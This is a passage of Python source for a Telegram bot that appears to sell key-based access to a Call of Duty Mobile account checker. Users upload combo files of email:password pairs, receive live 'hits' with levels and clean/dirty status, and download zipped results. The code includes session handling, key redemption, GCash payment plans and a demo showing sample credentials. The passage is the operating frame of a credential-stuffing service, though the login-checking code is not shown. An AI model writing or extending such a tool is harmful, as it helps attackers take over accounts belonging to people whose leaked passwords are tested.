            _body += f"{pe(3)} 🔄 Partial — checking still continues! {pe(3)}\n"
            _body += f"{pe(1)} Use /check for live stats"
        elif note:
            _body += f"{pe(3)} ⏹ Stopped — results are ready above! {pe(3)}"
        else:
            _body += f"{pe(5)} ✅ CHECKING COMPLETE! {pe(5)}\n"
            _body += f"{pe(2)} Your results file is below! {pe(2)}"
        m=await bot.send_message(chat_id=chat_id,parse_mode=ParseMode.HTML,reply_markup=clean_kb,text=_body)
        if m: track(uid,m.message_id)
    except: pass

    # Normalise to list
    if zip_paths is None: zip_paths=[]
    elif not isinstance(zip_paths,list): zip_paths=[zip_paths]
    zip_paths=[Path(p) for p in zip_paths if p and Path(p).exists() and Path(p).stat().st_size>100]

    if zip_paths:
        total_parts=len(zip_paths)
        for idx,zp in enumerate(zip_paths,1):
            try:
                if total_parts>1:
                    cap=(f" Part {idx}/{total_parts} — "
                         f"{'checking still continues!' if partial else 'your results!'}")
                else:
                    cap=" Partial — new results will follow when ready!" if partial else " Your results — enjoy!"
                with open(zp,"rb") as f:
                    dm=await bot.send_document(chat_id=chat_id,document=f,filename=zp.name,caption=cap)
                if dm: track(uid,dm.message_id)
            except Exception as e:
                em=await bot.send_message(chat_id=chat_id,text=f" Could not send {zp.name}: {e}")
                if em: track(uid,em.message_id)
    else:
        if not partial:
            nm=await bot.send_message(chat_id=chat_id,text=" No hit files (0 results).")
            if nm: track(uid,nm.message_id)

    if combo_file and not partial: del_combo(combo_file)

    # ── After final delivery: delete result folder ──
    if not partial:
        result_folder_d=None
        if zip_paths:
            result_folder_d=Path(zip_paths[0]).parent
        else:
            with sessions_lock:
                rf_str=active_sessions.get(uid,{}).get("result_folder","")
            if rf_str: result_folder_d=Path(rf_str)

        if result_folder_d and result_folder_d.exists():
            del_result_folder(result_folder_d)

# ════════════════════════════════════════════
#  USER COMMANDS
# ════════════════════════════════════════════
async def cmd_start(update,context):
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    ud,_=get_or_create_user(uid,tg.username or "",tg.first_name or "")

    # ── Maintenance mode gate ────────────────────────────────────────────
    if cfg.get("maintenance_mode") and not is_admin(tg.id,cfg):
        maint_msg = cfg.get("maintenance_message","⚙️ Bot is under maintenance. Please try again later.")
        await update.message.reply_text(
            f"{pe(3)} <b>Maintenance Mode</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} {maint_msg} {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Please check back soon!",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    if ud.get("banned") and not is_admin(tg.id,cfg):
        await update.message.reply_text(
            f"{pe(3)} <b>Access Denied</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} You have been <b>banned</b> from this bot. {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Contact admin for support.",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    bot_name = cfg.get("bot_name","MITZ Codm Checker Bot")

    if not ud.get("activated") and not is_admin(tg.id,cfg):
        wc = cfg.get("welcome_message","")
        base_txt = (
            f"{pe(5)} <b>{bot_name}</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Kamusta, <b>{tg.first_name}</b>! {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Wala ka pang key! {pe(2)}\n"
            f"{pe_thin()}\n"
            f"{pe(1)} Pwede kang bumili ng key gamit ang\n"
            f"   <b>GCash</b> — tap ang <b>🛒 Buy Key</b> para sa mga plans!\n"
            f"{pe_thin()}\n"
            f"{pe(1)} O subukan muna ang <b>🎮 Try Demo</b>\n"
            f"   para makita kung gaano kagaling ang bot!\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Kung may key ka na — i-redeem: {pe(2)}\n"
            f"<code>/redeem YOUR_KEY</code>"
        )
        if wc: base_txt += f"\n{pe_sep()}\n{pe(1)} {wc}"
        await update.message.reply_text(base_txt, parse_mode=ParseMode.HTML, reply_markup=kb_no_key()); return

    if not is_admin(tg.id,cfg) and check_key_expiry(uid):
        await update.message.reply_text(
            f"{pe(3)} <b>Key Expired</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Your access key has expired. {pe(2)}\n"
            f"{pe(1)} Contact admin to renew your key.",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    if cfg.get("locked") and not is_admin(tg.id,cfg) and not ud.get("vip"):
        await update.message.reply_text(
            f"{pe(3)} <b>Bot Locked</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Bot is currently locked by admin. {pe(2)}\n"
            f"{pe(1)} Only VIP users can access during lock.",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    is_adm = is_admin(tg.id,cfg)
    is_vip = ud.get("vip",False)
    iv = is_vip or is_adm
    lim = ud.get("custom_limit") or (cfg.get("vip_limit") if iv else cfg.get("global_limit"))
    ml  = cfg.get("max_lines_per_check")
    lim_s = f"\n{pe(1)} Limit       : <code>{lim:,}</code>" if lim else f"\n{pe(1)} Limit       : <code>Unlimited</code>"
    ml_s  = f"\n{pe(1)} Max/session : <code>{ml:,}</code>" if ml else ""
    cd_on,cd_left = check_cooldown(uid,cfg)
    cd_s = ""
    if cd_on:
        h,m_ = int(cd_left//60),int(cd_left%60)
        cd_s = f"\n{pe(1)} Cooldown    : <code>{'%dh %dm'%(h,m_) if h else '%dm'%m_} left</code>"
    exp_s = "" if is_adm else f"\n{pe(1)} Expiry      : {fmt_expiry(ud.get('key_expires_at'))}"
    note_s = f"\n{pe(1)} Note        : <i>{ud.get('note','')}</i>" if ud.get("note") and is_adm else ""

    badge = ""
    if is_adm:   badge = f" {pe(1)} <b>ADMIN</b>"
    elif is_vip: badge = f" {pe(2)} <b>VIP</b>"

    kb = kb_main_admin() if is_adm else kb_main_user()
    uptime_s = int(time.time()-_railway_start)
    uptime_h,uptime_m = uptime_s//3600,(uptime_s%3600)//60
    uptime_str=f"{uptime_h}h {uptime_m}m" if uptime_h else f"{uptime_m}m"

    total_hits  = ud.get("total_hits", 0)
    total_chk   = ud.get("total_checked", 0)
    sessions_c  = ud.get("sessions_count", 0)
    hit_pct     = int(total_hits / total_chk * 100) if total_chk else 0
    badge_rank  = "💎 ADMIN" if is_adm else ("🔥 VIP" if is_vip else "🎮 PLAYER")

    m = await update.message.reply_text(
        f"{pe(5)} <b>{bot_name}</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} {badge_rank} — <b>{tg.first_name}</b> {pe(3)}\n"
        f"{pe(1)} <code>ID: {tg.id}</code>\n"
        f"{pe_sep()}\n"
        f"{pe(2)} <b>YOUR STATS</b> {pe(2)}\n"
        f"{pe_thin()}\n"
        f"{pe(2)} Total Checked : <b><code>{total_chk:,}</code></b>\n"
        f"{pe(3)} Total Hits    : <b><code>{total_hits:,}</code></b>\n"
        f"{pe(1)} Sessions Done : <code>{sessions_c}</code>\n"
        f"{pe(1)} Hit Rate      : {_progress_bar(hit_pct)} <code>{hit_pct}%</code>\n"
        f"{pe_sep()}\n"
        f"{pe(2)} <b>ACCESS INFO</b> {pe(2)}\n"
        f"{pe_thin()}"
        f"{lim_s}{ml_s}{cd_s}{exp_s}{note_s}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} 🕐 Bot Uptime : <code>{uptime_str}</code>\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Ready to check! Tap a button below {pe(3)}",
        reply_markup=kb, parse_mode=ParseMode.HTML)
    if m: track(uid,m.message_id)

    # ── Show announcement if set ────────────────────────────────────────
    ann = cfg.get("announcement_text","").strip()
    if ann:
        am = await update.message.reply_text(
            f"{pe(3)} <b>📢 Announcement</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{ann}",
            parse_mode=ParseMode.HTML)
        if am: track(uid, am.message_id)

async def cmd_redeem(update,context):
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not context.args:
        await update.message.reply_text(
            f"{pe(2)} <b>Redeem Key</b> {pe(2)}\n"
            f"{pe_sep()}\n"
            f"Usage: <code>/redeem YOUR_KEY</code>",
            parse_mode=ParseMode.HTML); return
    key=context.args[0].strip(); keys=load_keys()
    if key not in keys:
        await update.message.reply_text(
            f"{pe(2)} <b>Invalid Key</b>\n"
            f"{pe_sep()}\n"
            f" That key does not exist. Contact admin.",
            parse_mode=ParseMode.HTML); return
    kd=keys[key]; used=kd.get("used_by",[])
    if uid in used:
        ud,_=get_or_create_user(uid)
        await update.message.reply_text(
            f"{pe(3)} <b>Already Redeemed!</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Expiry : {fmt_expiry(ud.get('key_expires_at'))} {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Use /start to begin checking! {pe(3)}",
            parse_mode=ParseMode.HTML); return
    if len(used)>=kd.get("max_users",1):
        await update.message.reply_text(
            f"{pe(2)} <b>Key Maxed Out</b>\n"
            f"{pe_sep()}\n"
            f" Key has reached max usage. Get a new one from admin.",
            parse_mode=ParseMode.HTML); return
    ud,users=get_or_create_user(uid,tg.username or "",tg.first_name or "")
    ud["activated"]=True; ud["key_used"]=key; ud["key_expires_at"]=kd.get("expires_at")
    ud["activated_at"]=datetime.now().isoformat(); ud["key_expired"]=False
    save_users(users); kd.setdefault("used_by",[]).append(uid); save_keys(keys)
    await update.message.reply_text(
        f"{pe(5)} <b>KEY ACTIVATED!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Expiry : {fmt_expiry(ud['key_expires_at'])} {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Tap /start to start checking! {pe(3)}",
        parse_mode=ParseMode.HTML)

async def _do_stop(update,context):
    uid=str(update.effective_user.id)
    tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    with sessions_lock: sess=active_sessions.get(uid)
    if not sess:
        await update.message.reply_text(
            f"{pe(1)} No active session.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    st=sess.get("status","")
    if st=="checking":
        fpath=sess.get("file","")
        try:
            with open(fpath,"r",encoding="utf-8",errors="ignore") as _f:
                rem=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
        except: rem=0
        ls2=sess.get("live_stats")
        cur_stats=ls2.get_stats() if ls2 else {}
        processed=cur_stats.get("total",0)
        if rem>0:
            lk=sess.get("lvl_key","lvl_all"); ck=sess.get("cf_key","cf_both")
            ll=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])["label"]
            cl=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])["label"]
            m=await update.message.reply_text(
                f"{pe(5)} <b>Pause or Stop?</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Processed : <code>{processed:,}</code> {pe(2)}\n"
                f"{pe(1)} Remaining : <code>{rem:,}</code> lines\n"
                f"{pe(2)} Level     : {ll} {pe(2)}\n"
                f"{pe(2)} Filter    : {cl} {pe(2)}\n"
                f"{pe_sep()}\n"
                f"{pe(3)} Continue or stop and get results? {pe(3)}",
                reply_markup=kb_stop_prompt(), parse_mode=ParseMode.HTML)
            if m: track(uid,m.message_id)
        else:
            sess["stop_event"].set()
            clear_persisted_session(uid)
            await update.message.reply_text(
                f"{pe(5)} <b>Stop Signal Sent!</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Results will be zipped and sent shortly. {pe(2)}",
                parse_mode=ParseMode.HTML, reply_markup=main_kb)
    elif st in ("waiting_file","file_received"):
        c=sess.get("file")
        if c: del_combo(c)
        clear_persisted_session(uid)
        with sessions_lock:
            if uid in active_sessions: del active_sessions[uid]
        await update.message.reply_text(
            f"{pe(3)} <b>Session Cancelled</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} File deleted. {pe(2)}\n"
            f"{pe(1)} Tap Check Accounts to start fresh.",
            parse_mode=ParseMode.HTML, reply_markup=main_kb)
    else:
        await update.message.reply_text(
            f"{pe(1)} No active checking session.", parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_stop(u,c): await _do_stop(u,c)
async def cmd_cancel(u,c): await _do_stop(u,c)

async def cmd_hits_on(update, context):
    """Enable hit notifications for this user (/hitson)."""
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    users=load_users()
    if uid not in users:
        await update.message.reply_text(f"{pe(1)} Use /start first.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    users[uid]["hits_notif"]=True; save_users(users)
    await update.message.reply_text(
        f"{pe(5)} <b>Hit Notifications: ON</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"You will receive a message for every hit found.\n"
        f"{pe(1)} Tap <b>{BTN_HITS_OFF}</b> to turn off.",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_hits_off(update, context):
    """Disable hit notifications for this user (/hitsoff)."""
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    users=load_users()
    if uid not in users:
        await update.message.reply_text(f"{pe(1)} Use /start first.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    users[uid]["hits_notif"]=False; save_users(users)
    await update.message.reply_text(
        f"{pe(2)} <b>Hit Notifications: OFF</b> {pe(2)}\n"
        f"{pe_sep()}\n"
        f"You will no longer receive per-hit messages.\n"
        f"{pe(1)} Tap <b>{BTN_HITS_ON}</b> to turn back on.",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_demo(update, context):
    """Demo mode — show a fake CODM check to non-key users."""
    tg = update.effective_user; uid = str(tg.id); cfg = load_config()
    bot_name = cfg.get("bot_name","MITZ Codm Checker Bot")

    wait_m = await update.message.reply_text(
        f"{pe(5)} <b>DEMO MODE</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Simulating CODM check... {pe(2)}\n"
        f"{pe(1)} Sandali lang ha, loading...",
        parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())
    await asyncio.sleep(2)

    # Fake sample data for demo
    import random as _rnd
    _sample = [
        ("testuser1@gmail.com", "pass123", True,  145, "Server 1"),
        ("sample2@yahoo.com",   "qwerty",  False, 0,   "N/A"),
        ("player3@gmail.com",   "abc123",  True,  312, "Server 2"),
        ("demo4@hotmail.com",   "pass456", False, 0,   "N/A"),
        ("gamer5@gmail.com",    "xyz789",  True,  88,  "Server 1"),
    ]

    # Show animated checking messages
    for i, (email, pw, hit, lvl, srv) in enumerate(_sample, 1):
        await asyncio.sleep(1)
        if hit:
            await update.effective_chat.send_message(
                f"{pe(3)} <b>🎯 LIVE HIT DETECTED!</b> {pe(3)}\n"
                f"{pe_sep()}\n"
                f"📧 Email  : <code>{email}</code>\n"
                f"🔑 Pass   : <code>{pw}</code>\n"
                f"🎮 Level  : <b>{lvl}</b>\n"
                f"🌍 Server : {srv}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} CODM FOUND! {pe(2)}\n"
                f"{pe(1)} <i>[ DEMO MODE — buy key for real results ]</i>",
                parse_mode=ParseMode.HTML)

    await asyncio.sleep(1.5)

    # Delete the wait message
    try: await wait_m.delete()
    except: pass

    # Show demo results card
    demo_stats = {"total": 5, "valid": 5, "invalid": 0, "clean": 3, "not_clean": 2,
                  "has_codm": 3, "no_codm": 2}
    acc_pct = 60
    badge = _hit_badge(3)

    kb_buy = InlineKeyboardMarkup([[
        InlineKeyboardButton("🛒 Bumili ng Key — GCash!", callback_data="gcash_buy")
    ]])

    await update.effective_chat.send_message(
        f"{pe(5)} <b>DEMO RESULTS</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} {badge} {pe(3)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} <b>RESULTS BREAKDOWN</b> {pe(2)}\n"
        f"{pe_thin()}\n"
        f"{pe(2)} Processed  : <b><code>5</code></b>\n"
        f"{pe(2)} Valid       : <code>5</code>  {pe(1)} Invalid : <code>0</code>\n"
        f"{pe(2)} Clean       : <code>3</code>  {pe(1)} Dirty   : <code>2</code>\n"
        f"{pe_sep()}\n"
        f"{pe(3)} 🎯 CODM HITS : <b><code>3</code></b>  {pe(1)} No CODM : <code>2</code>\n"
        f"{pe(1)} Hit Rate  : {_progress_bar(acc_pct)} <code>{acc_pct}%</code>\n"
        f"{pe_sep()}\n"
        f"{pe(5)} <b>DEMO COMPLETE!</b> {pe(5)}\n"
        f"{pe_thin()}\n"
        f"{pe(2)} Gusto mo ng <b>REAL</b> results? {pe(2)}\n"
        f"{pe(1)} I-unlock ang buong bot — bumili ng key!\n"
        f"{pe(1)} GCash lang — mura at mabilis! 🔥",
        parse_mode=ParseMode.HTML, reply_markup=kb_buy)


async def cmd_buy(update, context):
    """Show GCash payment plans."""
    tg = update.effective_user; cfg = load_config()
    bot_name = cfg.get("bot_name","MITZ Codm Checker Bot")
    gcash_num  = cfg.get("gcash_number","09943470058")
    gcash_name = cfg.get("gcash_name","JA...R KA.L T.")

    await update.message.reply_text(
        f"{pe(5)} <b>BUY A KEY — GCash</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Piliin ang plan mo! {pe(3)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} 🔑 3 Days    — ₱50\n"
        f"{pe(2)} 🔑 7 Days    — ₱70\n"
        f"{pe(2)} 🔑 1 Month   — ₱100\n"
        f"{pe(3)} 💎 Lifetime  — ₱150\n"
        f"{pe_sep()}\n"
        f"{pe(1)} I-tap ang plan para makita ang\n"
        f"   GCash number at payment steps!",
        parse_mode=ParseMode.HTML, reply_markup=kb_gcash_plans())


async def on_photo(update, context):
    """Handle receipt photo for GCash payment."""
    tg = update.effective_user; uid = str(tg.id); cfg = load_config()

    with sessions_lock:
        _await_plan = active_sessions.get(uid, {}).get("awaiting_receipt")

    if not _await_plan:
        return  # Not waiting for a receipt, ignore

    plan = GCASH_PLANS.get(_await_plan, {})
    plan_label = plan.get("label","Unknown")
    plan_price = plan.get("price","?")
    uname = tg.username or tg.first_name or uid

    # Clear awaiting state
    with sessions_lock:
        if uid in active_sessions:
            active_sessions[uid].pop("awaiting_receipt", None)

    # Notify user
    await update.message.reply_text(
        f"{pe(5)} <b>RESIBO NATANGGAP!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Plan  : <b>{plan_label}</b> ({plan_price}) {pe(3)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Napadala na ang resibo mo sa admin! {pe(2)}\n"
        f"{pe(1)} Hintayin ang approval — usually 5–30 minuto.\n"
        f"{pe(1)} Magrereply ako pag na-approve na! 🙏",
        parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())

    # Forward to all admins with approve/deny buttons
    admin_ids = cfg.get("admin_ids", [])
    caption = (
        f"{pe(5)} <b>💳 BAGONG PAYMENT REQUEST!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Buyer   : @{uname} (<code>{uid}</code>) {pe(2)}\n"
        f"{pe(2)} Plan    : <b>{plan_label}</b> — {plan_price} {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Approve o Deny? {pe(3)}"
    )
    for adm_id in admin_ids:
        try:
            photo = update.message.photo[-1]
            await context.bot.send_photo(
                chat_id=adm_id,
                photo=photo.file_id,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_markup=kb_gcash_admin(uid, _await_plan))
        except Exception as _e:
            log.warning(f"Could not forward receipt to admin {adm_id}: {_e}")


async def cmd_delete_file(update,context):
    """Delete user's current combo file so they can upload a new one."""
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    with sessions_lock: sess=active_sessions.get(uid)
    uc=COMBO_DIR/uid
    existing=list(uc.glob("*.txt")) if uc.exists() else []
    if not existing and (not sess or not sess.get("file")):
        await update.message.reply_text(
            f"{pe(1)} You have no file to delete.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    if sess and sess.get("status")=="checking":
        sess["stop_event"].set()
    deleted=[]
    for f in existing:
        try: f.unlink(); deleted.append(f.name)
        except: pass
    if sess and sess.get("file"):
        try:
            fp=Path(sess["file"])
            if fp.exists(): fp.unlink()
            if fp.name not in deleted: deleted.append(fp.name)
        except: pass
    if uc.exists():
        try:
            if not any(uc.iterdir()): uc.rmdir()
        except: pass
    clear_persisted_session(uid)
    with sessions_lock:
        if uid in active_sessions: del active_sessions[uid]
    names=", ".join(f"<code>{n}</code>" for n in deleted) if deleted else "file"
    await update.message.reply_text(
        f"{pe(3)} <b>File Deleted!</b>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Deleted: {names}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Tap <b>{BTN_CHECK}</b> to upload a new file.",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_status(update,context):
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    ud,_=get_or_create_user(uid)
    with sessions_lock: sess=active_sessions.get(uid)
    is_adm=is_admin(tg.id,cfg); is_vip=ud.get("vip",False); iv=is_adm or is_vip
    lim=cfg.get("vip_limit") if iv else cfg.get("global_limit")
    cd_on,cd_left=check_cooldown(uid,cfg)
    cd_s=""
    if cd_on:
        h,m_=int(cd_left//60),int(cd_left%60)
        cd_s=f"\n{pe(1)} Cooldown : <code>{'%dh %dm'%(h,m_) if h else '%dm'%m_} left</code>"
    if not sess:
        await update.message.reply_text(
            f"{pe(2)} <b>Your Status</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Checked  : <code>{ud.get('total_checked',0):,}</code>\n"
            f"{pe(1)} Sessions : <code>{ud.get('sessions_count',0)}</code>\n"
            f"{pe(1)} Limit    : <code>{lim or 'Unlimited'}</code>{cd_s}\n"
            f"{pe(1)} Expiry   : {fmt_expiry(ud.get('key_expires_at'))}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} No active session.",
            parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    st=sess.get("status","unknown"); fn=Path(sess["file"]).name if sess.get("file") else "N/A"
    lk=sess.get("lvl_key","lvl_all"); ck=sess.get("cf_key","cf_both")
    sm={"waiting_file":"Waiting for file","file_received":"File ready","checking":"Checking","done":"Finished"}
    ls2=sess.get("live_stats"); cur=ls2.get_stats() if ls2 else {}
    m=await update.message.reply_text(
        f"{pe(2)} <b>Session Status</b>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Status  : <b>{sm.get(st,st)}</b>\n"
        f"{pe(1)} File    : <code>{fn}</code>\n"
        f"{pe(1)} Level   : {LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS['lvl_all'])['label']}\n"
        f"{pe(1)} Filter  : {CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS['cf_both'])['label']}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Processed: <code>{cur.get('total',0):,}</code> {pe(2)}\n"
        f"{pe(3)} Hits CODM: <code>{cur.get('has_codm',0):,}</code> {pe(3)}",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)
    if m: track(uid,m.message_id)

async def cmd_check(update,context):
    """Show live stats card — also works after checking finishes."""
    uid=str(update.effective_user.id)
    try: await update.message.delete()
    except: pass
    with sessions_lock: sess=active_sessions.get(uid)
    if not sess or sess.get("status") not in ("checking","done"):
        m=await update.effective_chat.send_message("ℹ No active checking session.\nUse /start to begin.",parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    status=sess.get("status","checking")
    ls2=sess.get("live_stats")
    lk=sess.get("lvl_key","lvl_all"); ck=sess.get("cf_key","cf_both")
    ll=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])["label"]
    cl=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])["label"]

    # ── If session is done, use stored final_stats directly ──────────────
    if status=="done":
        display_stats=sess.get("final_stats") or {}
        if not display_stats and ls2:
            # fallback: compute from live_stats + prev_stats
            _cs=ls2.get_stats()
            _ps=sess.get("prev_stats",{})
            _pp=sess.get("prev_processed",0)
            display_stats=dict(_cs)
            if _ps:
                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                    display_stats[_k]=_cs.get(_k,0)+_ps.get(_k,0)
            display_stats["total"]=_pp+_cs.get("total",0)
        t=display_stats.get("total",0)
        orig=sess.get("orig_total",t)
        rf_path=sess.get("result_folder") if sess else None
        card=stats_card(t,orig,display_stats,ll,cl,result_folder=rf_path)
        # Append finished label
        card=card.rstrip()+"<b>\n\n Checking finished!</b>"
        m=await update.effective_chat.send_message(card,parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    # ── Active checking ──────────────────────────────────────────────────
    combo=sess.get("file")
    cur_stats=ls2.get_stats() if ls2 else {}
    with sessions_lock:
        prev_s=active_sessions.get(uid,{}).get("prev_stats",{})
        prev_proc=active_sessions.get(uid,{}).get("prev_processed",0)
    orig=sess.get("orig_total",0)
    curr_done=cur_stats.get("total",0)
    done_count=prev_proc+curr_done
    total_disp=orig if orig else done_count
    if total_disp and done_count>total_disp: done_count=total_disp
    if prev_s:
        display_stats=dict(cur_stats)
        for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
            display_stats[_k]=cur_stats.get(_k,0)+prev_s.get(_k,0)
        display_stats["total"]=done_count
    else:
        display_stats=dict(cur_stats)
        display_stats["total"]=done_count
    rf_path=sess.get("result_folder") if sess else None
    card=stats_card(done_count,total_disp,display_stats,ll,cl,result_folder=rf_path)
    m=await update.effective_chat.send_message(card,parse_mode=ParseMode.HTML)
    if m: track(uid,m.message_id)

async def cmd_myresultsfile(update,context):
    """Send a snapshot zip of current in-progress results — does NOT stop checking."""
    uid=str(update.effective_user.id)
    ok,ud,_=await gate(update,context)
    if not ok: return

    with sessions_lock:
        sess=active_sessions.get(uid)

    if not sess or sess.get("status")!="checking":
        m=await update.message.reply_text(
            " <b>No active checking session.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Start a session first via /start, then use /myresultsfile "
            "anytime during checking to get a snapshot of your current hits.",
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    rf_str=sess.get("result_folder","")
    if not rf_str or not Path(rf_str).exists():
        m=await update.message.reply_text(
            " <b>No results folder found.</b>\n"
            "Checking may have just started — try again in a moment.",
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    rf_path=Path(rf_str)
    result_files=[f for f in rf_path.rglob("*") if f.is_file() and not f.name.endswith(".zip")]
    if not result_files:
        m=await update.message.reply_text(
            " <b>No hits yet.</b>\n"
            "Keep checking — use /myresultsfile again once hits come in!",
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    ts_snap=datetime.now().strftime("%Y%m%d_%H%M%S")
    snap_zip=rf_path/f"snapshot_{uid}_{ts_snap}.zip"
    try:
        with zipfile.ZipFile(snap_zip,"w",zipfile.ZIP_DEFLATED) as zf:
            for f in result_files:
                zf.write(f,f.relative_to(rf_path))
    except Exception as e:
        m=await update.message.reply_text(f" Could not create snapshot: <code>{e}</code>",parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    ls2=sess.get("live_stats")
    cur_stats=ls2.get_stats() if ls2 else {}
    prev_s=sess.get("prev_stats",{})
    hits=(cur_stats.get("has_codm",0)+(prev_s.get("has_codm",0) if prev_s else 0))
    clean=(cur_stats.get("clean",0)+(prev_s.get("clean",0) if prev_s else 0))
    processed=(sess.get("prev_processed",0)+cur_stats.get("total",0))

    try:
        nm=await update.message.reply_text(
            f" <b>Results Snapshot</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Hits (CODM) : <code>{hits:,}</code>\n"
            f" Clean       : <code>{clean:,}</code>\n"
            f" Processed   : <code>{processed:,}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Checking is still running! /check for live stats.",
            parse_mode=ParseMode.HTML)
        if nm: track(uid,nm.message_id)
        if snap_zip.exists() and snap_zip.stat().st_size>50:
            with open(snap_zip,"rb") as f:
                dm=await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,filename=snap_zip.name,
                    caption=" Snapshot — checking still running, more hits may come!")
            if dm: track(uid,dm.message_id)
    except Exception as e:
        log.warning(f"myresultsfile send failed uid={uid}: {e}")
    finally:
        try:
            if snap_zip.exists(): snap_zip.unlink()
        except: pass

async def cmd_clean(update,context):
    uid=str(update.effective_user.id); chat=update.effective_chat.id
    try: await update.message.delete()
    except: pass
    with bot_msg_lock: ids=list(bot_messages.get(uid,[]))
    d=f=0
    for mid in ids:
        try: await context.bot.delete_message(chat_id=chat,message_id=mid); d+=1
        except: f+=1
        await asyncio.sleep(0.05)
    with bot_msg_lock: bot_messages.pop(uid,None)
    try:
        c=await context.bot.send_message(chat_id=chat,
            text=f" Deleted <b>{d}</b> message(s).\n<i>Self-destructing in 5s…</i>",parse_mode=ParseMode.HTML)
        await asyncio.sleep(5); await c.delete()
    except: pass

# ════════════════════════════════════════════
#  NEW USER & ADMIN COMMANDS
# ════════════════════════════════════════════

async def cmd_myinfo(update, context):
    """Show detailed info about yourself."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not await gate(update, context): return
    ud,_=get_or_create_user(uid, tg.username or "", tg.first_name or "")
